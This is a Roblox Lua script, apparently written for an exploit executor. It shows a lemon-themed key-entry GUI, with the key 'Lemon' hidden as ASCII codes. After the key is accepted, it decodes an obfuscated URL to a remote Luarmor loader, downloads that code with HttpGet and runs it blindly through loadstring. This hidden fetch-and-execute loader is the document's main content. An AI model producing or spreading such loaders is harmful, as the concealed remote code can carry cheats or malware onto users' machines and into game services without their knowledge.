-- RobloxScriptKey – Lemon-themed Key system with working script loader

-- Key encoded as ASCII numbers ("Lemon")
local keyData = {76, 101, 109, 111, 110}
local function decodeKey(tbl)
    local result = ""
    for _, v in ipairs(tbl) do
        result = result .. string.char(v)
    end
    return result
end
local validKey = decodeKey(keyData)

-- GUI
local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
gui.Name = "LemonKeyUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 320, 0, 160)
frame.Position = UDim2.new(0.5, -160, 0.5, -80)
frame.BackgroundColor3 = Color3.fromRGB(255, 240, 150)
frame.BorderSizePixel = 0

local label = Instance.new("TextLabel", frame)
label.Text = "🍋 Enter your Lemon Key:"
label.Size = UDim2.new(1, 0, 0, 35)
label.BackgroundColor3 = Color3.fromRGB(255, 225, 100)
label.TextColor3 = Color3.fromRGB(90, 50, 0)
label.Font = Enum.Font.GothamBold
label.TextSize = 22
label.BorderSizePixel = 0

local box = Instance.new("TextBox", frame)
box.PlaceholderText = "Type 'Lemon'"
box.Size = UDim2.new(0.9, 0, 0, 30)
box.Position = UDim2.new(0.05, 0, 0, 45)
box.BackgroundColor3 = Color3.fromRGB(255, 255, 180)
box.TextColor3 = Color3.fromRGB(0, 0, 0)
box.Font = Enum.Font.Gotham
box.TextSize = 18

local button = Instance.new("TextButton", frame)
button.Text = "🍋 Submit"
button.Size = UDim2.new(0.9, 0, 0, 30)
button.Position = UDim2.new(0.05, 0, 0, 85)
button.BackgroundColor3 = Color3.fromRGB(255, 210, 0)
button.TextColor3 = Color3.fromRGB(0, 0, 0)
button.Font = Enum.Font.GothamBold
button.TextSize = 18

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1, 0, 0, 20)
feedback.Position = UDim2.new(0, 0, 1, -22)
feedback.TextColor3 = Color3.fromRGB(200, 0, 0)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 16

-- Encrypted Luarmor URL
local encryptedURL = {
    104,116,116,112,115,58,47,47,97,112,105,46,108,117,97,114,109,111,114,46,110,101,116,
    47,102,105,108,101,115,47,118,51,47,108,111,97,100,101,114,115,47,
    102,102,100,102,101,97,100,102,48,97,102,55,57,56,55,52,49,56,48,54,101,97,
    52,48,52,54,56,50,97,57,51,56,46,108,117,97
}
local function decodeURL(tbl)
    local s = ""
    for _, v in ipairs(tbl) do
        s = s .. string.char(v)
    end
    return s
end

-- Logic
button.MouseButton1Click:Connect(function()
    local input = box.Text:match("^%s*(.-)%s*$")

    if input == validKey then
        feedback.Text = ""
        gui:Destroy()

        local url = decodeURL(encryptedURL)
        print("✅ Loading script from:", url)

        local success, result = pcall(function()
            return game:HttpGet(url)
        end)

        if success then
            local func, err = loadstring(result)
            if func then
                func()
            else
                warn("❌ Script compile error:", err)
            end
        else
            warn("❌ Failed to load script:", result)
        end
    else
        feedback.Text = "❌ Invalid Key"
        wait(2)
        feedback.Text = ""
    end
end)
